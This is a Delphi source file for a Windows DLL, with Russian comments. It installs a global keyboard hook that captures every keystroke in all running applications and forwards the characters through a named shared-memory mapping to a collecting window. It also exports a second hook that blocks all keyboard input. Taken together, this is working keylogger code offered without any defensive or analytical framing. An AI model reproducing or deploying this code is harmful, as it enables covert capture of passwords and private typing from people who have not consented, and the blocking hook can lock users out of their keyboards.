library getcl;

uses
  Windows, Forms, Messages, SysUtils, Classes, Graphics,
  Controls, Dialogs, StdCtrls, ComCtrls, Variants, ExtCtrls;

type // для хука на клаву для отслеживания клавиш
 PHookRec = ^THookRec;
 THookRec = record
  AppHnd: integer;
  MemoHnd: integer;
 end;

{$R *.res}

const
  WM_USER=$0400;
  WM_KEYBHOOK=WM_USER+346;

var // для хука на клаву для отслеживания клавиш
 Hooked: Boolean;
 hKeyHook, hMemo, hMemFile, hApp: hWnd;
 PHookRec1: PHookRec;

var // для хука на клаву чтобы не работала
 Dummy: integer=0;
 CurrentHook: HHook;

// хук на клавиатуру (чтобы не работала)

function GetModuleFileNameStr(Instance: THandle): string;
var
 buffer: array [0..MAX_PATH] of Char;
begin
 GetModuleFileName(Instance, buffer, MAX_PATH);
 Result:=buffer;
end;

function GlobalKeyBoardHook(code: integer; wParam: integer; lParam:
integer): longword; stdcall;
begin
 if Code<0
 then Result:=CallNextHookEx(CurrentHook, code, wparam, lparam)
 else Result:=1;
end;

function SetKeyboardHook: Boolean; stdcall; export;
begin
 // на мышь - WM_MOUSE
 CurrentHook:=SetWindowsHookEx(WH_KEYBOARD, @GlobalKeyBoardHook,HInstance, 0);
end;

function RemoveKeyboardHook: Boolean; stdcall; export;
begin
 Result:=UnhookWindowshookEx(CurrentHook);
end;

// хук на клавиатуру для отслеживания нажимаемых клавиш 

function KeyHookFunc(Code, VirtualKey, KeyStroke: Integer): LRESULT; stdcall;
var
 KeyState1: TKeyBoardState;
 AryChar: array[0..1] of char;
 Count: integer;
begin
 Result:=0;
 if Code=HC_NOREMOVE
 then Exit;
 Result:=CallNextHookEx(hKeyHook, Code, VirtualKey, KeyStroke);
 if Code<0
 then Exit;
 if Code=HC_ACTION
 then
  begin
   if ((KeyStroke and (1 shl 30))<>0)
   then
    if not IsWindow(hMemo)
    then
     begin
      // I moved the OpenFileMapping up here so it would not be opened
      // unless the app the DLL is attatched to gets some Key messages
      hMemFile:=OpenFileMapping(FILE_MAP_WRITE, False, 'Global7v9k');
      PHookRec1:=MapViewOfFile(hMemFile, FILE_MAP_WRITE, 0, 0, 0);
      if PHookRec1<>nil
      then
       begin
        hMemo:=PHookRec1.MemoHnd;
        hApp:=PHookRec1.AppHnd;
       end;
      end;
    if ((KeyStroke and (1 shl 30))<>0)
    then
     begin
      GetKeyboardState(KeyState1);
      Count:=ToAscii(VirtualKey, KeyStroke, KeyState1, AryChar, 0);
      if Count=1
      then
       begin
        SendMessage(hMemo, WM_CHAR, Ord(AryChar[0]), 0);
        // I included 2 ways to get the Charaters, a Memo Hnadle and
        // a WM_USER+1678 message to the program
        PostMessage(hApp, WM_USER + 1678, Ord(AryChar[0]), 0);
       end;
     end;
  end;
end;

function StartHook(MemoHandle, AppHandle: HWND): Byte; export;
begin
 Result:=0;
 if Hooked
 then
  begin
   Result:=1;
   Exit;
  end;
 if not IsWindow(MemoHandle)
 then
  begin
   Result:=4;
   Exit;
  end;
 hKeyHook:=SetWindowsHookEx(WH_KEYBOARD, KeyHookFunc, hInstance, 0);
 if hKeyHook>0
 then
  begin
   // you need to use a mapped file because this DLL attatches to every app
   // that gets windows messages when it's hooked, and you can't get info except
   // through a Globally avaiable Mapped file
   hMemFile:=CreateFileMapping($FFFFFFFF, // $FFFFFFFF gets a page memory file
     nil,              // no security attributes
     PAGE_READWRITE,   // read/write access
     0,                // size: high 32-bits
     SizeOf(THookRec), // size: low 32-bits
     'Global7v9k');    // name of map object
   PHookRec1:=MapViewOfFile(hMemFile, FILE_MAP_WRITE, 0, 0, 0);
   hMemo:=MemoHandle;
   PHookRec1.MemoHnd:=MemoHandle;
   hApp:=AppHandle;
   PHookRec1.AppHnd:=AppHandle;
   // set the Memo and App handles to the mapped file
   Hooked:=true;
  end
 else Result:=2;
end;

function StopHook: Boolean; export;
begin
 if PHookRec1<>nil
 then
  begin
   UnmapViewOfFile(PHookRec1);
   CloseHandle(hMemFile);
   PHookRec1:=nil;
  end;
 if Hooked
 then Result:=UnhookWindowsHookEx(hKeyHook)
 else Result:=true;
 Hooked:=false;
end;

procedure EntryProc(dwReason: DWORD);
begin
 if (dwReason=Dll_Process_Detach)
 then
  begin
   if PHookRec1<>nil
   then
    begin
     UnmapViewOfFile(PHookRec1);
     CloseHandle(hMemFile);
    end;
   UnhookWindowsHookEx(hKeyHook);
  end;
end;

exports SetKeyboardHook, RemoveKeyboardHook, StartHook, StopHook;

begin
 PHookRec1:=nil;
 Hooked:=False;
 hKeyHook:=0;
 hMemo:=0;
 DLLProc:=@EntryProc;
 EntryProc(Dll_Process_Attach);
end.
